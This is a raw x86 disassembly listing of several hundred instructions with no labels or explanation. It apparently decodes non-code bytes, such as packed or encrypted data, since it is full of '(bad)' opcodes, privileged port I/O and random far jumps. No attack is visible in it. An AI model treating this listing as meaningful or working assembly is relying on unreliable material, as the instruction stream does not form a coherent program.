  4111c8:	or     DWORD PTR [esi-0x1c],eax
  4111cb:	les    eax,FWORD PTR [eax+0x7]
  4111ce:	lods   al,BYTE PTR ds:[esi]
  4111cf:	xchg   ecx,eax
  4111d0:	push   0xfffffff9
  4111d2:	or     bh,bh
  4111d4:	push   0x3a0f99bd
  4111d9:	(bad)  
  4111da:	jbe    0x41122c
  4111dc:	nop
  4111dd:	add    eax,0x738439ad
  4111e2:	ja     0x4111b1
  4111e4:	adc    eax,0x4f10c898
  4111e9:	lds    edi,FWORD PTR [ebp-0xe41fd8b]
  4111ef:	repnz cmp BYTE PTR [eax+0x4b6eea84],0xb1
  4111f7:	push   ss
  4111f8:	arpl   WORD PTR [ecx+0x7b],si
  4111fb:	pop    ds
  4111fc:	cwde   
  4111fd:	mov    ebx,0xf85a0034
  411202:	fwait
  411203:	mov    dl,0xa3
  411205:	rcl    DWORD PTR [edi-0x665ad3d2],1
  41120b:	imul   edx,DWORD PTR [ecx+edi*8-0x75d6481a],0xffffffd3
  411213:	retf   0xbe63
  411216:	adc    BYTE PTR [ecx],0x4a
  411219:	mov    al,0xd8
  41121b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41121c:	or     ebp,DWORD PTR [esi-0x454e2d3]
  411222:	pushf  
  411223:	int    0x34
  411225:	or     DWORD PTR [ebx+0x1ee8cc5],edx
  41122b:	popf   
  41122c:	retf   
  41122d:	add    BYTE PTR [ecx],bh
  41122f:	sbb    ah,BYTE PTR [edx-0x74]
  411232:	xchg   esp,eax
  411233:	xor    ecx,DWORD PTR [ecx+ebp*4-0x4]
  411237:	mov    ds:0x3ecc7b80,eax
  41123c:	cmp    DWORD PTR [esp+eiz*4],ecx
  41123f:	int3   
  411240:	adc    bl,BYTE PTR [esi+edi*1-0x6c929417]
  411247:	jp     0x41127e
  411249:	xor    DWORD PTR [edx-0x58],ecx
  41124c:	cwde   
  41124d:	fldenv [ecx+0x24]
  411250:	je     0x4111f6
  411252:	std    
  411253:	rcr    BYTE PTR [ebx],cl
  411255:	push   ebx
  411256:	cvtps2pi mm6,QWORD PTR gs:[eax+0x18]
  41125b:	shl    DWORD PTR [esi],cl
  41125d:	js     0x4112c7
  41125f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411260:	fs ret 
  411262:	pop    eax
  411263:	add    ecx,edi
  411265:	dec    ecx
  411266:	repz inc esp
  411268:	xchg   dh,dl
  41126a:	stos   DWORD PTR es:[edi],eax
  41126b:	aas    
  41126c:	cwde   
  41126d:	ret    0xbb48
  411270:	adc    dl,BYTE PTR [esi-0x64]
  411273:	cmp    al,0x5b
  411275:	push   0xb
  411277:	inc    edx
  411278:	pop    ss
  411279:	xor    BYTE PTR [esi+edx*4-0x76],cl
  41127d:	std    
  41127e:	jl     0x411298
  411280:	cdq    
  411281:	xchg   ebx,eax
  411282:	inc    bh
  411284:	mov    ecx,0x336d6422
  411289:	pop    ds
  41128a:	in     al,0xed
  41128c:	push   esi
  41128d:	addr16 mov bh,0x50
  411290:	cmc    
  411291:	loopne 0x4112ab
  411293:	xchg   ebp,eax
  411294:	popa   
  411295:	adc    DWORD PTR [ebx+0x6235d454],esp
  41129b:	data16 sti 
  41129d:	mov    BYTE PTR [edx+0xd],dh
  4112a0:	dec    ebp
  4112a1:	dec    edx
  4112a2:	aas    
  4112a3:	push   cs
  4112a4:	inc    ecx
  4112a5:	or     bh,BYTE PTR es:[edx]
  4112a8:	loopne 0x41124b
  4112aa:	mov    dh,BYTE PTR [ebx+edi*2+0x6b]
  4112ae:	mov    ecx,DWORD PTR [esi+0x2302971]
  4112b4:	fldl2t 
  4112b6:	and    BYTE PTR [ebx-0x67],al
  4112b9:	mov    esp,0xb93ed48a
  4112be:	mov    ebp,ebp
  4112c0:	das    
  4112c1:	jg     0x4112f4
  4112c3:	out    0x96,al
  4112c5:	jae    0x411253
  4112c7:	mov    esi,0xd18fe925
  4112cc:	repnz xor DWORD PTR [esi-0xf],ecx
  4112d0:	cli    
  4112d1:	mov    edx,0xe8363bc7
  4112d6:	xor    DWORD PTR [ecx],edi
  4112d8:	lods   al,BYTE PTR ds:[esi]
  4112d9:	rcr    DWORD PTR [ecx+ebp*1-0x23],1
  4112dd:	je     0x41134a
  4112df:	inc    ebx
  4112e0:	loope  0x41134a
  4112e2:	mov    dh,0xfc
  4112e5:	test   DWORD PTR [ecx],ebp
  4112e7:	(bad)  
  4112e8:	mov    ch,bl
  4112ea:	kandw  k7,k3,k6
  4112ee:	ja     0x41136e
  4112f0:	add    eax,0x6f638c1c
  4112f5:	ins    BYTE PTR es:[edi],dx
  4112f6:	sub    DWORD PTR [edx+0x5c6e5b52],ebp
  4112fc:	push   ebx
  4112fd:	retf   
  4112fe:	push   eax
  4112ff:	sahf   
  411300:	test   BYTE PTR [edx],dl
  411302:	loope  0x411293
  411304:	push   edx
  411305:	jno    0x411357
  411307:	jp     0x411372
  411309:	pcmpeqd mm7,QWORD PTR [esi]
  41130c:	(bad)  
  41130d:	and    ecx,DWORD PTR [edi]
  41130f:	loope  0x411368
  411311:	or     eax,0x604a3c63
  411316:	and    ecx,edi
  411318:	(bad)  
  411319:	adc    al,0x4c
  41131b:	adc    esp,DWORD PTR [ebp-0x4d5fbfe6]
  411321:	lahf   
  411322:	sar    BYTE PTR [esi],cl
  411324:	add    eax,0x35e86b8
  411329:	(bad)  
  41132a:	push   ebp
  41132b:	xor    BYTE PTR [esi-0x4],bh
  41132e:	or     DWORD PTR [ecx],edx
  411330:	and    eax,esi
  411332:	frstor ss:[esi+0x4e]
  411336:	or     BYTE PTR [eax+0x30],bh
  411339:	in     al,0x7e
  41133b:	mov    bl,0x3d
  41133d:	test   DWORD PTR [edx-0x29],edi
  411340:	jbe    0x41137c
  411342:	or     BYTE PTR [ebx],ch
  411344:	retf   
  411345:	loopne 0x411357
  411347:	cmc    
  411348:	scas   eax,DWORD PTR es:[edi]
  411349:	sub    al,0xfe
  41134b:	cli    
  41134c:	mov    al,0xfb
  41134e:	mov    ah,0xe3
  411350:	mov    dh,BYTE PTR [esi]
  411352:	fbstp  TBYTE PTR [ebp+edx*8+0x1397ce0e]
  411359:	and    al,0xe1
  41135b:	mov    ah,0xc7
  41135d:	in     eax,0xe9
  41135f:	xor    al,BYTE PTR [esi]
  411361:	mov    esi,0x689911ee
  411366:	into   
  411367:	cli    
  411368:	xor    al,0xfc
  41136a:	cs mov esi,0x7020a7f
  411370:	sub    BYTE PTR [eax],bh
  411372:	mov    ebp,0x281a21ab
  411377:	in     eax,0x6e
  411379:	fisttp DWORD PTR [ecx+0x6f]
  41137c:	add    esi,DWORD PTR [ebx-0x1f]
  41137f:	cmp    ah,ch
  411381:	mov    BYTE PTR [edi-0x1],al
  411384:	jno    0x41135a
  411386:	lods   eax,DWORD PTR ds:[esi]
  411387:	frndint 
  411389:	mov    ebx,0x478bd09a
  41138e:	dec    edi
  41138f:	aam    0xff
  411391:	retf   
  411392:	pop    esi
  411393:	stos   DWORD PTR es:[edi],eax
  411394:	mov    ch,ah
  411396:	jmp    0x411345
  411398:	mov    DWORD PTR [edi],edx
  41139a:	and    BYTE PTR [eax],bl
  41139c:	jp     0x411372
  41139e:	lods   eax,DWORD PTR ds:[esi]
  41139f:	sbb    DWORD PTR [ecx+0x38c1d1f0],ebp
  4113a5:	xchg   esi,eax
  4113a6:	sub    eax,0x31b897bf
  4113ab:	sbb    ebx,DWORD PTR [ebx]
  4113ad:	pop    eax
  4113ae:	fld    TBYTE PTR [ebx-0x6e]
  4113b1:	arpl   WORD PTR [esi-0x35],di
  4113b4:	sar    DWORD PTR [ecx+0x7d],1
  4113b7:	jns    0x4113a4
  4113b9:	dec    ecx
  4113ba:	jne    0x41133c
  4113bc:	(bad)  
  4113bd:	pop    ebx
  4113be:	fs loopne 0x411364
  4113c1:	pop    ebx
  4113c2:	xor    BYTE PTR [eax],bl
  4113c4:	mov    al,ds:0x60b9ca69
  4113c9:	mov    bl,0x8f
  4113cb:	scas   eax,DWORD PTR es:[edi]
  4113cc:	rcr    DWORD PTR [ebp-0x6cba4a68],cl
  4113d2:	and    eax,DWORD PTR [ebx]
  4113d4:	and    eax,0x6163dbee
  4113d9:	icebp  
  4113da:	mov    eax,0x40059d66
  4113df:	(bad)  
  4113e0:	and    ebx,0xf6d96cde
  4113e6:	or     ebx,DWORD PTR [edi+0x2d]
  4113e9:	add    DWORD PTR [esi+0xdbbf35e],esp
  4113ef:	lahf   
  4113f0:	sti    
  4113f1:	int3   
  4113f2:	fidiv  WORD PTR [esi+0x10]
  4113f5:	cmp    al,0xa2
  4113f7:	cmp    eax,0x8acb077c
  4113fc:	cmp    eax,DWORD PTR [ebp+ebp*2-0x54]
  411400:	jle    0x4113a6
  411402:	das    
  411403:	push   eax
  411404:	scas   eax,DWORD PTR es:[edi]
  411405:	pop    ss
  411406:	fisttp WORD PTR [esi-0x11]
  411409:	hlt    
  41140a:	stos   DWORD PTR es:[edi],eax
  41140b:	ins    BYTE PTR es:[edi],dx
  41140c:	(bad)  [ebp-0x114fd9b3]
  411412:	sbb    DWORD PTR [ecx],ecx
  411414:	push   0xa77ee887
  411419:	(bad)  
  41141a:	mov    al,BYTE PTR [ebx+eax*2-0x4b]
  41141e:	sbb    esp,DWORD PTR [esi-0x5738e7ec]
  411424:	shr    esi,0x4e
  411427:	or     cl,al
  411429:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41142a:	xchg   edi,eax
  41142b:	rcl    DWORD PTR [edi],0x16
  41142e:	mov    WORD PTR [ecx-0x34893a91],ds
  411434:	mov    edx,0x87c72e94
  411439:	shl    eax,0xac
  41143c:	leave  
  41143d:	mov    ds:0xf95a17cb,al
  411442:	fsub   QWORD PTR [eax+0x56]
  411445:	mov    fs,esp
  411447:	cmp    ah,BYTE PTR [edx-0x3f9ddc2]
  41144d:	sbb    eax,esi
  41144f:	xor    DWORD PTR [esi],esp
  411451:	in     eax,0xbc
  411453:	xor    DWORD PTR [esi+0x22d1d328],edi
  411459:	inc    edi
  41145a:	or     DWORD PTR [ebx*8+0x58e6a204],esi
  411461:	pop    ecx
  411462:	ins    DWORD PTR es:[edi],dx
  411463:	jl     0x4114db
  411465:	daa    
  411466:	mov    dh,BYTE PTR [edi+0x6e]
  411469:	sub    BYTE PTR [eax],al
  41146b:	icebp  
  41146c:	cmp    al,0xbb
  41146e:	mov    BYTE PTR [eax],ch
  411470:	jmp    0xa05b:0xcc9a2add
  411477:	(bad)  
  411478:	pop    ebp
  411479:	std    
  41147a:	mov    BYTE PTR [edx-0x2],ah
  41147d:	popa   
  41147e:	jb     0x4114d7
  411480:	fwait
  411481:	pop    eax
  411482:	imul   esp,ebp,0x9563872d
  411488:	add    dh,cl
  41148a:	sub    DWORD PTR [edi+0x678f0ce9],ebx
  411490:	and    esi,edx
  411492:	jg     0x411442
  411494:	mov    ecx,0x766246f6
  411499:	test   ecx,ebx
  41149b:	mov    bh,0xf
  41149d:	lods   al,BYTE PTR ds:[esi]
  41149e:	es je  0x411488
  4114a1:	or     ch,cl
  4114a3:	or     ch,ah
  4114a5:	fiadd  DWORD PTR [edx-0x51ddf0b3]
  4114ab:	push   ecx
  4114ac:	jns    0x41142f
  4114ae:	adc    DWORD PTR [esi-0x79],eax
  4114b1:	das    
  4114b2:	cwde   
  4114b3:	(bad)  
  4114b4:	fimul  WORD PTR [eax-0x49898ef1]
  4114ba:	mov    al,0xef
  4114bc:	lock sbb BYTE PTR [edx-0x7dfe02be],0xdf
  4114c4:	add    ebp,DWORD PTR [edi+0x6120e8a9]
  4114ca:	ds sbb bh,ch
  4114cd:	gs jnp 0x411500
  4114d0:	clc    
  4114d1:	jns    0x4114f4
  4114d3:	(bad)  
  4114d4:	and    DWORD PTR [esi+ebp*8],esi
  4114d7:	xchg   ebx,eax
  4114d8:	(bad)  
  4114da:	mov    ah,0xb2
  4114dc:	test   ax,0x6bf9
  4114e0:	aas    
  4114e1:	jmp    0xd68d28e0
  4114e6:	out    0x43,eax
  4114e8:	xor    eax,0xc02c8618
  4114ed:	push   cs
  4114ee:	mov    esi,0xbff57e
  4114f3:	nop
  4114f4:	push   esp
  4114f5:	data16 test al,0x2d
  4114f8:	icebp  
  4114f9:	dec    eax
  4114fa:	sub    al,0xa8
  4114fc:	inc    edx
  4114fd:	jbe    0x4114a0
  4114ff:	ins    DWORD PTR es:[edi],dx
  411500:	loop   0x4114c2
  411502:	pusha  
  411503:	pop    edx
  411504:	and    BYTE PTR [eax],ah
  411506:	mov    edx,0xc93fade7
  41150b:	loope  0x411541
  41150d:	cwde   
  41150e:	sbb    BYTE PTR [eax-0x25],dl
  411511:	lods   al,BYTE PTR ds:[esi]
  411512:	and    edx,DWORD PTR [esi+0xb2d300b]
  411518:	popa   
  411519:	dec    ecx
  41151a:	push   0x25
  41151c:	mov    bh,0xa9
  41151e:	idiv   BYTE PTR [edi+0x70c2eb77]
  411524:	adc    BYTE PTR [ecx+ecx*2+0x1c],bh
  411528:	scas   al,BYTE PTR es:[edi]
  411529:	jnp    0x4114d8
  41152b:	test   BYTE PTR [eax],bl
  41152d:	mov    ebx,0x39b1f706
  411532:	adc    DWORD PTR [edi-0x3993c67f],0x3d
  411539:	cwde   
  41153a:	scas   eax,DWORD PTR es:[edi]
  41153b:	es daa 
  41153d:	xadd   ebx,eax
  411540:	jmp    0x411549
  411542:	fadd   DWORD PTR [eax-0x51]
  411545:	push   eax
  411546:	mov    eax,0xa9ace32a
  41154b:	fstp   QWORD PTR [ebx]
  41154d:	push   DWORD PTR [eax+edx*8+0x5c]
  411551:	mov    BYTE PTR [edx+0x70],cl
  411554:	sub    al,0xd6
  411556:	lahf   
  411557:	mov    cs,ebx
  411559:	pop    edi
  41155a:	sar    BYTE PTR [ebx],1
  41155c:	fucomi st,st(6)
  41155e:	mov    ch,0x9e
  411560:	popa   
  411561:	jnp    0x4114f4
  411563:	pop    ss
  411564:	dec    edi
  411565:	and    eax,0xa36f513a
  41156a:	sbb    al,0xb3
  41156c:	mov    bl,dl
  41156e:	sbb    edi,DWORD PTR ds:0x58bfaf06
  411574:	not    BYTE PTR [edx+ebx*2-0x6e596503]
  41157b:	stos   DWORD PTR es:[edi],eax
  41157c:	cmc    
  41157d:	out    dx,eax
  41157e:	sbb    bl,BYTE PTR [ebx-0x79]
  411581:	mov    edi,DWORD PTR [eax+0x2b4b80d0]
  411587:	sub    al,0xe6
  411589:	es test bh,0xa0
  41158d:	mov    ch,BYTE PTR [edi+0x7a2a7d2f]
  411593:	dec    ebp
  411594:	outs   dx,DWORD PTR ds:[esi]
  411595:	jo     0x4115c6
  411597:	pusha  
  411598:	push   ebx
  411599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41159a:	sahf   
  41159b:	jmp    0xd79ccac1
  4115a0:	pop    edx
  4115a1:	jp     0x41159a
  4115a3:	jmp    0x88a3d951
  4115a8:	pop    esi
  4115a9:	push   edi
  4115aa:	or     ah,BYTE PTR ds:0x6c8eb4df
  4115b0:	enter  0x1aaa,0xde
  4115b4:	mov    bl,0x88
  4115b6:	inc    ecx
  4115b7:	je     0x411543
  4115b9:	xchg   esi,eax
  4115ba:	pop    ds
  4115bb:	ins    BYTE PTR es:[edi],dx
  4115bc:	mov    al,ds:0xfc0fda2c
  4115c1:	mov    ebp,edi
  4115c3:	cmp    al,0xa8
  4115c5:	sbb    esp,ebx
  4115c7:	fwait
  4115c8:	rcr    DWORD PTR [ecx],0x75
  4115cb:	sahf   
  4115cc:	(bad)  
  4115ce:	inc    eax
  4115cf:	call   0x605b1136
  4115d4:	loopne 0x41155a
  4115d6:	push   ecx
  4115d7:	pop    ecx
  4115d8:	push   0xdd681577
  4115dd:	pop    ebx
  4115de:	outs   dx,BYTE PTR ds:[esi]
  4115df:	jo     0x411580
  4115e1:	mov    ds:0xb0d4526a,al
  4115e6:	rol    BYTE PTR [edx+0x1882cc69],cl
  4115ec:	and    edx,DWORD PTR [eax+0x1621f5b]
  4115f2:	dec    esp
  4115f3:	call   0x488b:0x14b8d8f9
  4115fa:	sahf   
  4115fb:	inc    DWORD PTR [edi+0x3e]
  4115fe:	xchg   edx,eax
  4115ff:	dec    edi
  411600:	fs xchg esi,eax
  411602:	push   edx
  411603:	push   ss
  411604:	sbb    al,al
  411606:	popf   
  411607:	test   eax,0xd23f9f00
  41160c:	lea    ebx,[edx+0x377bdf78]
  411612:	add    eax,0x5af92414
  411617:	push   edi
  411618:	sub    edi,DWORD PTR [eax]
  41161a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41161b:	mov    eax,ds:0x887e724e
  411620:	inc    esi
  411621:	sub    eax,0xa54c7878
  411626:	ror    BYTE PTR [ecx+0x1cd5fb2],0xb9
  41162d:	js     0x4115e9
  41162f:	dec    ebx
  411630:	mov    edx,0xb23a762e
  411635:	add    DWORD PTR [eax],0x4a964a77
  41163b:	push   ss
  41163c:	scas   eax,DWORD PTR es:[edi]
  41163d:	inc    eax
  41163e:	out    0xf5,eax
  411640:	mov    esi,0x2f77e1a
  411645:	add    DWORD PTR [edi+ebp*8-0x2c],edi
  411649:	xchg   BYTE PTR [ebx+0x37],dh
  41164c:	add    al,0xee
  41164e:	test   DWORD PTR [esi-0x5c900840],esi
  411654:	aas    
  411655:	int3   
  411656:	cmc    
  411657:	jno    0x4115ea
  411659:	scas   al,BYTE PTR es:[edi]
  41165a:	ja     0x411634
  41165c:	out    dx,eax
  41165d:	adc    eax,0x6295a582
  411662:	pop    ss
  411663:	or     DWORD PTR [esi-0x75],esp
  411666:	stc    
  411667:	push   edx
  411668:	jnp    0x4116ca
  41166a:	mov    ecx,0xce04066c
  41166f:	leave  
  411670:	popa   
  411671:	cmp    BYTE PTR [edx],0x1e
  411674:	jae    0x4115f8
  411676:	pop    ebx
  411678:	cmp    al,0xe8
  41167a:	ins    DWORD PTR es:[edi],dx
  41167b:	push   esi
  41167c:	addr16 push eax
  41167e:	(bad)  
  41167f:	push   edx
  411680:	mov    ebx,0xc78509fe
  411685:	(bad)  
  411686:	neg    DWORD PTR [edi+esi*2-0x6d]
  41168a:	int3   
  41168b:	shl    DWORD PTR [esi+0x28dd14fd],1
  411691:	sub    bl,bl
  411693:	(bad)  [eax-0x3e]
  411696:	xchg   esp,eax
  411697:	adc    al,0xc7
  411699:	pop    eax
  41169a:	pop    esp
  41169b:	lods   al,BYTE PTR ds:[esi]
  41169c:	pop    es
  41169d:	(bad)  
  41169e:	cli    
  41169f:	sbb    ch,dl
  4116a1:	xchg   edi,eax
  4116a2:	inc    ecx
  4116a3:	cmp    cl,ah
  4116a5:	jb     0x41162d
  4116a7:	or     al,0x15
  4116a9:	and    al,0xd8
  4116ab:	arpl   bx,sp
  4116ad:	es js  0x4116ea
  4116b0:	and    ah,BYTE PTR [ebp-0x26166dab]
  4116b6:	in     eax,0x30
  4116b8:	and    BYTE PTR [esi-0x2b],dl
  4116bb:	sub    ch,BYTE PTR ds:[eax+0x28d9e604]
  4116c2:	push   0x550bf48b
  4116c7:	je     0x5a98f26
  4116cd:	cmovge ebx,DWORD PTR [eax-0xa]
  4116d1:	out    0x74,al
  4116d3:	fdivr  st,st(1)
  4116d5:	adc    DWORD PTR [eax],ebp
  4116d7:	in     eax,0xf6
  4116d9:	push   cs
  4116da:	ficom  WORD PTR [di]
  4116dd:	mov    eax,0x34e4fdbf
  4116e2:	pop    ebx
  4116e3:	leave  
  4116e4:	stos   DWORD PTR es:[edi],eax
  4116e5:	jne    0x411699
  4116e7:	fwait
  4116e8:	adc    bh,BYTE PTR [esi]
  4116ea:	sbb    al,0x1f
  4116ec:	popf   
  4116ed:	popf   
  4116ee:	mov    ecx,0x79881e6b
  4116f3:	ret    0xeeaa
  4116f6:	cs test ecx,ecx
  4116f9:	cli    
  4116fa:	stc    
  4116fb:	push   esp
  4116fc:	pop    ebx
  4116fd:	ja     0x411757
  4116ff:	jl     0x4116ee
  411701:	ss jge 0x4116fa
  411704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411705:	out    dx,al
  411706:	pop    ebx
  411707:	out    dx,al
  411708:	jge    0x411724
  41170a:	icebp  
  41170b:	ds inc edx
  41170d:	sub    al,0x13
  41170f:	ds pop edx
  411711:	pusha  
  411712:	mov    bh,BYTE PTR [ecx-0x13]
  411715:	fldenv [esp+ecx*8-0x62]
  411719:	adc    DWORD PTR [ebx+edi*2-0x53f6ab0b],0x92eb71db
  411724:	test   edx,0xf2fc10ce
  41172a:	imul   edi,DWORD PTR [bp+di],0xe241392e
  411731:	scas   eax,DWORD PTR es:[edi]
  411732:	int3   
  411733:	dec    esi
  411734:	xchg   esi,eax
  411735:	cli    
  411736:	(bad)  
  411737:	and    esp,DWORD PTR [ebx+edi*8+0x7b7a29f]
  41173e:	or     ecx,DWORD PTR [edi+0xa426424]
  411744:	pop    ds
  411745:	mov    fs,WORD PTR [edx]
  411747:	int    0xc2
  411749:	add    ebx,0xacb68731
  41174f:	aaa    
  411750:	mov    al,ds:0x506c0c06
  411755:	or     BYTE PTR [ebx-0x4c87b6fe],0xc9
  41175c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41175d:	xchg   edx,eax
  41175e:	adc    eax,0xb51ae546
  411763:	xchg   ebp,eax
  411764:	mov    ax,ds:0x21951d3
  41176a:	pop    ss
  41176b:	add    BYTE PTR [ebp+edi*2-0x5d],bh
  41176f:	pop    esp
  411770:	pop    edx
  411771:	push   ebx
  411772:	and    ebx,ebx
  411774:	mov    ch,0x63
  411776:	adc    al,0xdd
  411778:	loope  0x411770
  41177a:	jl     0x4117b3
  41177c:	imul   eax,DWORD PTR [edi-0x7968a588],0x5c28131b
  411786:	mov    edx,0xa3b17f68
  41178b:	sbb    dh,dh
  41178d:	mov    ah,0x77
  41178f:	xor    DWORD PTR [edi],0x66
  411792:	stos   BYTE PTR es:[edi],al
  411793:	fwait
  411794:	sbb    edx,0x50
  411797:	or     al,0x9e
  411799:	aas    
  41179a:	iret   
  41179b:	jg     0x411773
  41179d:	es (bad) 
  4117a0:	retf   0x78e7
  4117a3:	push   ds
  4117a4:	cmp    edi,esi
  4117a6:	xor    ebx,esi
  4117a8:	mov    dl,0x1d
  4117aa:	clc    
  4117ab:	es pop es
  4117ad:	dec    esp
  4117ae:	mov    ch,0xf8
  4117b0:	add    BYTE PTR [edx+0x20],dl
  4117b3:	mov    ebp,DWORD PTR [ecx+0x6a524d41]
  4117b9:	sub    DWORD PTR [edi+esi*1],edi
  4117bc:	in     eax,0x78
  4117be:	popf   
  4117bf:	dec    edx
  4117c0:	jno    0x4117cc
  4117c2:	(bad)  
  4117c3:	pop    eax
  4117c4:	pop    ecx
  4117c5:	jae    0x411790
  4117c7:	mul    DWORD PTR [edx+0x1d00f0d4]
  4117cd:	jbe    0x411823
  4117cf:	or     DWORD PTR [edi],eax
  4117d1:	pop    ds
  4117d2:	xor    al,0x43
  4117d4:	jne    0x41180c
  4117d6:	out    dx,al
  4117d7:	lods   al,BYTE PTR ds:[esi]
  4117d8:	das    
  4117d9:	sbb    eax,0xb178125
  4117de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117df:	nop
  4117e0:	push   ecx
  4117e1:	cmp    cl,BYTE PTR [ecx]
  4117e3:	ss fs push ss
  4117e6:	fnstsw WORD PTR [ecx]
  4117e8:	pop    es
  4117e9:	ins    DWORD PTR es:[edi],dx
  4117ea:	jl     0x4117b5
  4117ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117ed:	cdq    
  4117ee:	mov    ah,0x14
  4117f0:	bnd jno 0x4117ba
  4117f3:	jne    0x4117bf
  4117f5:	xor    ah,BYTE PTR [esi+ecx*2+0x6efafd9d]
  4117fc:	xchg   edx,eax
  4117fd:	sub    BYTE PTR [edx-0xf2e0851],bh
  411803:	addr16 jae 0x41185d
  411806:	les    edx,FWORD PTR [ecx+edx*2-0x9]
  41180a:	mov    cl,dh
  41180c:	jmp    0xfca7952c
  411811:	push   ds
  411812:	scas   eax,DWORD PTR es:[edi]
  411813:	shl    BYTE PTR ds:0x8d1d6049,1
  411819:	jnp    0x411858
  41181b:	mov    ds:0xb0f0b810,al
  411820:	pop    eax
  411821:	xchg   esp,eax
  411822:	mov    al,0x93
  411824:	mov    DWORD PTR [ebx+0x648f1877],edx
  41182a:	or     esi,DWORD PTR [ebx]
  41182c:	and    al,0x9e
  41182e:	mov    ebp,0xf5be293d
  411833:	out    0x77,eax
  411835:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411836:	out    0x87,al
  411838:	adc    eax,0xc4043b79
  41183d:	(bad)  
  41183e:	push   0xb8fa8b0f
  411843:	imul   ebx,DWORD PTR [esi-0x4a],0x1c
  411847:	adc    ecx,DWORD PTR [ebx+ebx*4]
  41184a:	ss adc edi,edx
  41184d:	dec    esp
  41184e:	xchg   ch,cl
  411850:	retf   0xcc18
  411853:	dec    edi
  411854:	inc    ecx
  411855:	add    al,0xde
  411857:	and    DWORD PTR [edi+0x6cd4c56a],0xfffffff7
  41185e:	mov    bl,BYTE PTR [ebx+0x6d]
  411861:	push   esi
  411862:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411863:	iret   
  411864:	popf   
  411865:	cmp    esp,eax
  411867:	adc    BYTE PTR [esi],ch
  411869:	adc    DWORD PTR [ebp+0x52e8130],ebx
  41186f:	lods   al,BYTE PTR ds:[esi]
  411870:	aas    
  411871:	xor    ebp,0x8da3353
  411877:	dec    edx
  411878:	push   ebp
  411879:	stc    
  41187a:	cld    
  41187b:	push   ecx
  41187c:	fwait
  41187d:	call   0x9cf2f8ee
  411882:	loop   0x41181f
  411884:	push   ebx
  411885:	fist   WORD PTR [edi]
  411887:	mov    cl,0x3a
  411889:	fsub   DWORD PTR [eax+0x696e2a29]
  41188f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411890:	retf   0x884c
  411893:	in     al,dx
  411894:	sbb    al,0x97
  411896:	xor    eax,0x8690fea
  41189b:	push   0xffffff9a
  41189d:	and    al,0x55
  41189f:	xor    esi,ebp
  4118a1:	(bad)  
  4118a2:	std    
  4118a3:	jmp    0x411853
  4118a5:	add    eax,DWORD PTR [esi]
  4118a7:	add    eax,0x8b98d863
  4118ac:	mov    al,ds:0xf03defe4
  4118b1:	inc    edi
  4118b2:	mov    ebp,DWORD PTR [esi]
  4118b4:	fsubr  DWORD PTR [edi]
  4118b6:	cdq    
  4118b7:	jmp    0x4ab:0xc9dfd3e8
  4118be:	dec    esp
  4118bf:	inc    ebp
  4118c0:	and    DWORD PTR [ecx],esi
  4118c2:	(bad)  [edx+0x11]
  4118c5:	mov    ah,cl
  4118c7:	jne    0x411863
  4118c9:	jns    0x411854
  4118cb:	jnp    0x4118a4
  4118cd:	mov    ah,0x2b
  4118cf:	test   dl,cl
  4118d1:	mov    BYTE PTR [ebp+0x7a],dl
  4118d4:	sub    al,0xf7
  4118d6:	data16 (bad) 
  4118d9:	in     al,dx
  4118da:	rcl    DWORD PTR [esi-0x43802538],0xc0
  4118e1:	dec    edi
  4118e2:	lahf   
  4118e3:	dec    ebp
  4118e4:	pushf  
  4118e5:	xchg   DWORD PTR [ecx-0x41e55165],edx
  4118eb:	add    dl,cl
  4118ed:	adc    BYTE PTR [ebx-0x6555807e],ah
  4118f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118f4:	pop    edx
  4118f5:	bound  eax,QWORD PTR [eax+edi*4+0x8]
  4118f9:	lods   al,BYTE PTR ds:[esi]
  4118fa:	test   BYTE PTR [ecx],al
  4118fc:	leave  
  4118fd:	jbe    0x411962
  4118ff:	sbb    BYTE PTR [esi],bh
  411901:	js     0x411962
  411903:	jg     0x411961
  411905:	test   eax,0xa734c28b
  41190a:	(bad)  
  41190b:	mov    eax,ds:0x6b9442b7
  411910:	xlat   BYTE PTR ds:[ebx]
  411911:	rcl    BYTE PTR [esi],0x55
  411914:	imul   BYTE PTR [ebx]
  411916:	jg     0x41194b
  411918:	test   al,0xcf
  41191a:	xchg   ecx,eax
  41191b:	mov    ss,esp
  41191d:	adc    eax,0xbae8aee5
  411922:	xor    DWORD PTR [edi],esp
  411924:	pop    ecx
  411925:	adc    DWORD PTR [eax],ecx
  411927:	je     0x411907
  411929:	adc    edi,DWORD PTR [esi-0x5c]
  41192c:	adc    BYTE PTR [edi],bh
  41192e:	out    0x23,al
  411930:	mov    al,0xc7
  411932:	in     al,0x7f
  411934:	lock test eax,0xf9f2f0fc
  41193a:	pop    eax
  41193b:	adc    ah,cl
  41193d:	out    0x1d,eax
  41193f:	out    dx,al
  411940:	test   al,0x31
  411942:	addr16 jb 0x411971
  411945:	dec    ebx
  411946:	or     ah,BYTE PTR [edx+0x5e99be59]
  41194c:	in     al,dx
  41194d:	les    eax,FWORD PTR [esi+0x3a]
  411950:	jbe    0x41193c
  411952:	sub    eax,0x2a7b60b0
  411957:	sahf   
  411958:	out    0x28,al
  41195a:	enter  0x9738,0x8c
  41195e:	sahf   
  41195f:	sbb    ah,BYTE PTR [ecx*8-0x5ff58ac0]
  411966:	(bad)  
  411967:	jp     0x4119ab
  411969:	xchg   edx,eax
  41196a:	ins    BYTE PTR es:[edi],dx
  41196b:	daa    
  41196c:	and    ebp,DWORD PTR [ecx]
  41196e:	popf   
  41196f:	retf   
  411970:	aad    0x42
  411972:	mov    bh,0xe5
  411974:	mov    bl,0x79
  411976:	mov    eax,0xda9aa805
  41197b:	adc    eax,0x3bcbd7a8
  411980:	xor    esp,0x6f
  411983:	data16 repz cmp bh,bh
  411987:	test   BYTE PTR [esi+edx*8],0x13
  41198b:	mov    di,0x440a
  41198f:	pop    ds
